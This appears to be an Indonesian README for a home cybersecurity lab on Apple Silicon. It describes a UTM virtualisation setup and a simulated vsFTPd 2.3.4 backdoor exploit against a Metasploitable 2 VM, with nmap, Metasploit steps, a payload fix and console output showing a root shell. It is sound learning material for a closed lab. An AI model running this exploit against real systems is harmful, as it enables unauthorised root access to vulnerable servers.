# Cybersecurity-HomeLab-Setup

# 🛡️ Virtual Cybersecurity Lab on Apple Silicon (M1/M2/M3)

Repositori ini mendokumentasikan proses pembangunan lab *Penetration Testing* menggunakan arsitektur ARM pada MacBook. Tantangan utama dalam proyek ini adalah melakukan emulasi sistem x86 (Intel) di atas chip Apple Silicon.

## 🛠️ Tech Stack
- **Host OS:** macOS (Apple Silicon)
- **Virtualization:** [UTM](https://getutm.app/) (QEMU-based)
- **Attacker Machine:** Kali Linux 2024.x (ARM64 Native)
- **Victim Machine:** Metasploitable 2 (Linux x86 - Emulated)

## 🚀 Setup Highlights
### 1. Metasploitable 2 (x86 Emulation)
Karena Metasploitable 2 hanya tersedia untuk arsitektur Intel, saya menggunakan fitur **Emulasi x86_64** di UTM dengan konfigurasi:
- **Architecture:** x86_64
- **System:** Standard PC (Q35 + ICH9)
- **Network:** Shared Network (agar dapat berkomunikasi dengan Kali Linux)
- **Fix:** Menonaktifkan `UEFI Boot` agar sistem *legacy* ini dapat berjalan.

### 2. Kali Linux (Native ARM64)
Untuk performa maksimal, saya menginstal Kali Linux versi ARM64 secara native:
- **Mode:** Virtualize (bukan Emulate)
- **Display:** `virtio-ramfb` (untuk mengatasi masalah "Display output is not active" saat instalasi)

## ⚔️ Simulation: vsFTPd 2.3.4 Backdoor Exploit
Saya mensimulasikan serangan *backdoor* pada layanan FTP yang berjalan di target.

### Steps:
1. **Scanning:** Menggunakan `nmap -sV` untuk mengidentifikasi layanan yang berjalan.
2. **Exploitation:** Menggunakan Metasploit Framework (`msfconsole`).
3. **Troubleshooting:** Awalnya eksploitasi gagal membuat sesi (`no session was created`). Saya berhasil mengatasinya dengan mengganti payload secara manual ke `cmd/unix/interact`.

### Result:
```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 192.168.64.2:21 - Banner: 220 (vsFTPd 2.3.4)
[+] 192.168.64.2:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened
